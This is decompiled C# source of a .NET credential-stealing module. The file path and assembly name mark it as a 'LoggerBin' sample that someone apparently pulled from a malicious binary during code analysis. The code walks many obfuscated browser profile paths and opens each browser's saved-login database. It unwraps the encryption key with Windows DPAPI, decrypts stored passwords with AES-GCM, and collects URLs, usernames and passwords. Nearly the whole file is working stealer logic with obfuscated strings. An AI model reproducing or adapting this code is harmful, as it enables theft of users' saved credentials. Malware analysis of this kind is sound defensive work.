// Decompiled with JetBrains decompiler
// Type: GX.JA
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using BH;
using nq;
using rw;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace GX
{
  internal class JA
  {
    public static string LocalApplicationData;
    public static string ApplicationData;
    internal static JA jTF;

    public static List<NT> KWk()
    {
      Dictionary<string, string> dictionary = new Dictionary<string, string>();
      dictionary.Add(w4.bx(7178, w4.vY), JA.LocalApplicationData + w4.bx(7194, w4.vY));
      dictionary.Add(w4.bx(7246, w4.vY), Path.Combine(JA.ApplicationData, w4.bx(7260, w4.vY)));
      dictionary.Add(w4.bx(7318, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(7334, w4.vY)));
      dictionary.Add(w4.bx(7398, w4.vY), JA.LocalApplicationData + w4.bx(7424, w4.vY));
      dictionary.Add(w4.bx(7482, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(7512, w4.vY)));
      dictionary.Add(w4.bx(7562, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(7582, w4.vY)));
      dictionary.Add(w4.bx(7650, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(7676, w4.vY)));
      dictionary.Add(w4.bx(7716, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(7746, w4.vY)));
      dictionary.Add(w4.bx(7780, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(7810, w4.vY)));
      dictionary.Add(w4.bx(7888, w4.vY), JA.LocalApplicationData + w4.bx(7922, w4.vY));
      dictionary.Add(w4.bx(7962, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(7976, w4.vY)));
      dictionary.Add(w4.bx(8022, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8036, w4.vY)));
      dictionary.Add(w4.bx(8070, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8096, w4.vY)));
      dictionary.Add(w4.bx(8142, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8158, w4.vY)));
      dictionary.Add(w4.bx(8194, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8210, w4.vY)));
      dictionary.Add(w4.bx(8262, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8298, w4.vY)));
      dictionary.Add(w4.bx(8354, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8398, w4.vY)));
      dictionary.Add(w4.bx(8462, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8478, w4.vY)));
      dictionary.Add(w4.bx(8514, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8532, w4.vY)));
      dictionary.Add(w4.bx(8570, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8588, w4.vY)));
      dictionary.Add(w4.bx(8642, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8664, w4.vY)));
      dictionary.Add(w4.bx(8716, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8734, w4.vY)));
      dictionary.Add(w4.bx(8772, w4.vY), Path.Combine(JA.ApplicationData, w4.bx(8796, w4.vY)));
      dictionary.Add(w4.bx(8902, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8918, w4.vY)));
      dictionary.Add(w4.bx(8982, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(8998, w4.vY)));
      dictionary.Add(w4.bx(9048, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(9080, w4.vY)));
      dictionary.Add(w4.bx(9116, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(9136, w4.vY)));
      dictionary.Add(w4.bx(9176, w4.vY), Path.Combine(JA.LocalApplicationData, w4.bx(9206, w4.vY)));
      List<NT> ntList = new List<NT>();
      foreach (KeyValuePair<string, string> keyValuePair in dictionary)
        ntList.AddRange((IEnumerable<NT>) ox6.bx(keyValuePair.Value, keyValuePair.Key, w4.bx(9258, w4.vY), ox6.yxi));
      return ntList;
    }

    private static List<NT> RW9(string _param0, string _param1, string _param2 = "logins")
    {
      List<string> stringList = ixR.bx(_param0, ixR.Tx8);
      List<NT> ntList1 = new List<NT>();
      foreach (string path in stringList.ToArray())
      {
        if (File.Exists(path))
        {
          Sh sh;
          try
          {
            sh = new Sh(path);
          }
          catch (Exception ex)
          {
            continue;
          }
          if (eN.bx((object) sh, _param2, eN.mD))
          {
            for (int index = 0; index <= mW.bx((object) sh, mW.Wt) - 1; ++index)
            {
              try
              {
                string str1 = e9.bx((object) sh, index, w4.bx(9274, w4.vY), e9.Lz);
                string str2 = e9.bx((object) sh, index, w4.bx(9298, w4.vY), e9.Lz);
                string s = e9.bx((object) sh, index, w4.bx(9330, w4.vY), e9.Lz);
                if (s != null)
                {
                  string str3;
                  if (s.StartsWith(w4.bx(9362, w4.vY)) || s.StartsWith(w4.bx(9372, w4.vY)))
                  {
                    byte[] numArray = LxX.bx(Directory.GetParent(path).Parent.FullName, LxX.uxS);
                    if (numArray != null)
                      str3 = WxN.bx(Encoding.Default.GetBytes(s), numArray, WxN.TxD);
                    else
                      continue;
                  }
                  else
                    str3 = exB.bx(s, exB.xxW);
                  if (!string.IsNullOrEmpty(str1))
                  {
                    if (!string.IsNullOrEmpty(str2))
                    {
                      if (!string.IsNullOrEmpty(str3))
                      {
                        List<NT> ntList2 = ntList1;
                        NT nt = new NT();
                        yJ.bx((object) nt, str1, yJ.qc);
                        yJ.bx((object) nt, str2, yJ.rL);
                        yJ.bx((object) nt, str3, yJ.aQ);
                        yJ.bx((object) nt, _param1, yJ.oxM);
                        ntList2.Add(nt);
                      }
                    }
                  }
                }
              }
              catch (Exception ex)
              {
              }
            }
          }
        }
      }
      return ntList1;
    }

    private static List<string> iW2(string _param0)
    {
      List<string> stringList = new List<string>()
      {
        _param0 + w4.bx(9382, w4.vY),
        _param0 + w4.bx(9424, w4.vY)
      };
      if (Directory.Exists(_param0))
      {
        foreach (string directory in Directory.GetDirectories(_param0))
        {
          if (directory.Contains(w4.bx(9450, w4.vY)))
            stringList.Add(directory + w4.bx(9424, w4.vY));
        }
      }
      return stringList;
    }

    public static string rWU(byte[] _param0, byte[] _param1)
    {
      byte[] numArray1 = new byte[12];
      Array.Copy((Array) _param0, 3, (Array) numArray1, 0, 12);
      try
      {
        byte[] numArray2 = new byte[_param0.Length - 15];
        Array.Copy((Array) _param0, 15, (Array) numArray2, 0, _param0.Length - 15);
        byte[] numArray3 = new byte[16];
        byte[] numArray4 = new byte[numArray2.Length - numArray3.Length];
        Array.Copy((Array) numArray2, numArray2.Length - 16, (Array) numArray3, 0, 16);
        Array.Copy((Array) numArray2, 0, (Array) numArray4, 0, numArray2.Length - numArray3.Length);
        return (string) JA.NT7((object) Encoding.UTF8, (object) Kxt.bx((object) new fE(), _param1, numArray1, (byte[]) null, numArray4, numArray3, Kxt.Ux9));
      }
      catch (Exception ex)
      {
        return (string) null;
      }
    }

    public static byte[] hWD(string _param0)
    {
      string path = _param0 + w4.bx(9468, w4.vY);
      byte[] numArray1 = new byte[0];
      if (!File.Exists(path))
        return (byte[]) null;
      IEnumerator enumerator = new Regex(w4.bx(9496, w4.vY), RegexOptions.Compiled).Matches(File.ReadAllText(path)).GetEnumerator();
      try
      {
        while (JA.sTh((object) enumerator))
        {
          Match current = (Match) enumerator.Current;
          if (current.Success)
            numArray1 = Convert.FromBase64String(current.Groups[1].Value);
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          disposable.Dispose();
      }
      byte[] numArray2 = new byte[numArray1.Length - 5];
      Array.Copy((Array) numArray1, 5, (Array) numArray2, 0, numArray1.Length - 5);
      try
      {
        return (byte[]) JA.lT1((object) numArray2, (object) null, DataProtectionScope.CurrentUser);
      }
      catch (Exception ex)
      {
        return (byte[]) null;
      }
    }

    public static string hW8(string _param0)
    {
      switch (_param0)
      {
        case "":
        case null:
          return (string) null;
        default:
          try
          {
            return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(_param0), (byte[]) null, DataProtectionScope.CurrentUser));
          }
          catch (Exception ex)
          {
            return (string) null;
          }
      }
    }

    public JA()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    static JA()
    {
      yd.bx(yd.EI);
      JA.LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      JA.ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    }

    internal static object NT7([In] object obj0, [In] object obj1) => (object) ((Encoding) obj0).GetString((byte[]) obj1);

    internal static bool xTX() => JA.jTF == null;

    internal static JA TTN() => JA.jTF;

    internal static bool sTh([In] object obj0) => ((IEnumerator) obj0).MoveNext();

    internal static object lT1([In] object obj0, [In] object obj1, [In] DataProtectionScope obj2) => (object) ProtectedData.Unprotect((byte[]) obj0, (byte[]) obj1, obj2);
  }
}
